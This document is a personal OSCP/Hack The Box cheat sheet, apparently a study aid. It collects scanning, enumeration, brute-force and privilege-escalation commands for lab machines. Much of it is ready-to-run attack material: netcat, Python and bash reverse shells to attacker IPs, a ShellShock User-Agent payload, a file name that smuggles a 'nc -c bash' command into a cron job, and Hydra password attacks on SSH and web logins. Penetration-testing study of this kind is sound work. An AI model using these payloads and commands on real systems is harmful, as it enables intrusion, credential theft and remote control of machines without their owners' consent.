

### TOC

<!-- MarkdownTOC -->

- [Nmap + Initial Enumeration](#nmap--initial-enumeration)
	- [Nmap Vulnerability Scan Scripts](#nmap-vulnerability-scan-scripts)
	- [Initial Port Info Gathering](#initial-port-info-gathering)
	- [Searchsploit](#searchsploit)
	- [DNS + etc/hosts](#dns--etchosts)
		- [Zone Transfer](#zone-transfer)
	- [Nmap Automator](#nmap-automator)
- [Web Enumeration](#web-enumeration)
	- [Enumerate Directories](#enumerate-directories)
	- [Identify Software in Use](#identify-software-in-use)
- [Port Enumeration](#port-enumeration)
	- [Port 53 - DNS](#port-53---dns)
	- [Port 139 & 445 - SMB](#port-139--445---smb)
	- [Port 79 - Finger Service](#port-79---finger-service)
- [Login Brute Forcing](#login-brute-forcing)
	- [Hydra](#hydra)
	- [John the Ripper](#john-the-ripper)
- [Reverse Shells](#reverse-shells)
	- [Upgrading Shells](#upgrading-shells)
	- [BASH reverse shells](#bash-reverse-shells)
	- [BASH shell](#bash-shell)
- [Privilege Escalation](#privilege-escalation)
	- [Linux](#linux)
		- [sudo -l](#sudo--l)
		- [LinEnum](#linenum)
			- [Crontab](#crontab)
		- [pspy](#pspy)
		- [Cron Jobs](#cron-jobs)
		- [Chaining Vulns](#chaining-vulns)
- [File Transfer](#file-transfer)
- [Other Vulnerabilities](#other-vulnerabilities)
	- [ShellShock](#shellshock)
	- [Hijack Module/File Used by Script](#hijack-modulefile-used-by-script)
	- [Stenography Challenge](#stenography-challenge)
	- [SUID - SystemCtl](#suid---systemctl)
	- [NAME Configuration Parameter Command Injection](#name-configuration-parameter-command-injection)
	- [Magento](#magento)
- [Miscellaneous](#miscellaneous)
	- [Python SSL Issue](#python-ssl-issue)
	- [Decompress TAR files](#decompress-tar-files)
- [Other things to learn](#other-things-to-learn)
- [Review the following HTB writeups](#review-the-following-htb-writeups)
	- [Linux](#linux-1)

<!-- /MarkdownTOC -->



<br><br>

* This file will contain summarized notes for all things OSCP like hacking.


<br><br>

### Nmap + Initial Enumeration

* Initial scan:

```
nmap -sC -sV -O -oA nmap/initial <IP>
```

* All ports scan:

```
nmap -sC -sV -O -p1–65535 -oA nmap/full <IP>
```

```
nmap -sC -sV -O -p- -oA htb/nibbles/nmap/full 10.10.10.75
```


* UDP scan:

```
nmap -sU -O -oA nmap/udp <IP>
```

<br>

#### Nmap Vulnerability Scan Scripts


```
nmap --script vuln <IP>
```

* Run the script vuln scanner on specific ports:

```
nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor <IP>
```

<br>


#### Initial Port Info Gathering


* When there are many ports that are opened, it is a good idea to make initial notes about each port if possible.

* For example:

* Identify if the SSH version is running an old version.  Do this for any service identified

* If there ports running mail protocols, understand we may need to find a valid email before moving forward with those ones

* Research different ports and their identified services, and confirm if there is a tool that can be used for enumeration.  Like a port running RPCbind, there is a command called rpcinfo to begin enumeration


<br>


#### Searchsploit

* This tool can be used to determine if the software is associated with any vulnerabilities.

* Example, the application is using an off the shelf software called Elastix:

```
searchsploit elastix | grep 4\\.8\\.
```

* Transfer the exploit to attacker machine:

```
searchsploit -m 18650
```

* Review the script and identify what changes need to be done on it before executed the script.


<br>


#### DNS + etc/hosts

* The following command can attempt to find domain name:

```
nslookup <IP>
```

<br>


##### Zone Transfer

* Command for a zone transfer to get a list of all hosts for this domain. The host command syntax for performing a zone transfer is.

```
host -l <domain-name> <dns_server-address>
```

<br>

#### Nmap Automator

* Link - https://github.com/21y4d/nmapAutomator


* Run the nmapAutomator script to enumerate open ports and services running on those ports.


```
./nmapAutomator.sh 10.10.10.146 All
```

* All: Runs all the scans consecutively.


<br><br>


### Web Enumeration

* Begin by enumerating the web application or port 80/443 first to identify any foot holds.


<br>

#### Enumerate Directories

```
gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP>
```

```
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
```

<br>

* Don't forget to enumerate file extensions and virtual hosts/subdomains.


<br>

#### Identify Software in Use

* Identify software that is being used by the application and then use "searchsploit" to check if it contains any vulnerabilities, for example



<br><br>


### Port Enumeration


#### Port 53 - DNS

* When this port is open we can get the domain name through nslookup and attempt a zone transfer to enumerate name servers, hostnames, etc.


#### Port 139 & 445 - SMB

* Run smbmap to list available shares and permissions.

```
smbmap -H <IP>
```

* List the content of the shares.

```
smbmap -R -H <IP>
```

<br>

* Use smbclient to view more information about the shares.

```
smbclient -L //<IP>
```

* Login anonymously (without a password) into the general share.

```
smbclient //<IP>/general -N
```

* Download the creds.txt file from the target machine to the attack machine.

```
get creds.txt
```

<br>

#### Port 79 - Finger Service

* Port 79: running Sun Solaris fingerd

* Check if the user root exists:

```
root@kali:~# finger root@10.10.10.76
```

* http://pentestmonkey.net/tools/user-enumeration/finger-user-enum

```
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
```



<br><br>

### Login Brute Forcing

#### Hydra

* Hydra command to brute force password:

```
hydra -l 'admin' -P /usr/share/john/password.lst admin.cronos.htb http-post-form "/:username=^USER^&password=^PASS^&Login=Login:Your Login Name or Password is invalid"
```

<br>

```
hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
```

<br>

#### John the Ripper

* The sammy-hash.txt file contains a hash found from the /etc/shadow file

```
john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt
```


<br><br>


### Reverse Shells

* Setting up a reverse shell

* Set up in attacker machine:

```
nc -nlvp 4444
```

* Set up target machine:

```
nc -nv <Attacker IP> 4444 -e /bin/sh
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Attacker IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<br>

#### Upgrading Shells


* Once you get a shell for victim machine, we can upgrade it to make it more interactive:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

* To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```
stty raw -echo
```

* Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```
export TERM=xterm
```

#### BASH reverse shells

```
bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'
```

<br>

#### BASH shell

* We can get an easy shell if we can control a .sh file for example that is owned by root, add the following code in the file and execute it:

```
#!/bin/sh
bash
```

<br><br>

### Privilege Escalation


<br>

#### Linux


<br>


##### sudo -l

* Following command lists the allowed commands for my user:

```
sudo -l
```

* The following command can be used to change to another user (in this case we didn't need to know their password):

```
sudo -i -u <user name>
```

<br>


##### LinEnum

* https://github.com/rebootuser/LinEnum

* Download script to victim machine using Python Simple Server and Wget, then give it execution permissions and run it


<br>

###### Crontab

* https://tigr.net/3203/2014/09/13/getting-wordpress-cron-work-in-multisite-environment/

* This section of the LinEnum tool will show what files are being run as a cron job, if there are any files where we can write into, and are executed as root, we can gain a reverse shell as root by modifying the file


<br>


##### pspy


 * Link - https://github.com/DominicBreuker/pspy


<br>

##### Cron Jobs

```
bash-4.2$ cat crontab.guly 
*/3 * * * * php /home/guly/check_attack.php
```

* It’s running the file check_attack.php script every 3 minutes. If you’re not familiar with the crontab format, refer to the following link.

* In this example, the file contained code vulnerable to a command injection vulnerability, the code was grabbing the file name under the /uploads directory and using it directly in a dynamic command function:

* Exploit:

* Change to the /var/www/html/uploads directory and create the following file.

```
touch '; nc -c bash 10.10.14.12 3333'
```

* Wait for the cronjob to run and get a shell (set up listener)


<br>

##### Chaining Vulns

* The following link under the privilege escalation section, demonstrates a way to chain 2 vulnerabilities to gain access to a root shell:

* https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/sunday-writeup-w-o-metasploit.md


<br><br>


### File Transfer

* Start a simple HTTP server on the system where the file is already located:

```
python -m SimpleHTTPServer 9005
```

* Use wget on the system where we want to download file to:

```
wget http://10.10.14.30:9005/test.py
```


<br><br>


### Other Vulnerabilities


#### ShellShock

* Change the User Agent field to the following string. - http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell

```
() { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
```

<br>


#### Hijack Module/File Used by Script

* If you identify a script that is running a library/file, identify if you have write access to the file, then you can upload a reverse shell in there for example


<br>

#### Stenography Challenge

```
apt-get install steghide
```

```
steghide extract -sf <JPG Image File Name>
```


<br>


#### SUID - SystemCtl


* Link - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49


<br>

#### NAME Configuration Parameter Command Injection

* https://bugzilla.redhat.com/show_bug.cgi?id=1697473

* There is a space in the NAME parameter:

```
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
```

* Exploit:

```
Run the sh script and when prompted to enter the NAME value enter:

random bash
```

<br>


#### Magento

* https://github.com/steverobbins/magescan

```
php magescan.phar -vvv scan:all 10.10.10.140 > output
```

<br><br>


### Miscellaneous


<br>

#### Python SSL Issue

* If there is an issue with "SSL unsupported protocol error" when running a python script, this write up contains a work around - https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/beep-writeup-w-o-metasploit.md


<br>

#### Decompress TAR files

```
tar -C backup/ -xvf backup.tar
```


<br><br>

### Other things to learn

* Learn PHP.  Most of the scripts encountered in machines are in PHP from what I seen.



<br><br>


### Review the following HTB writeups

#### Linux

* https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/swagshop-writeup-w-o-metasploit.md

* https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/tabby-writeup-w-o-metasploit.md

* https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation/blob/master/linux-boxes/valentine-writeup-w-o-metasploit.md

<br>


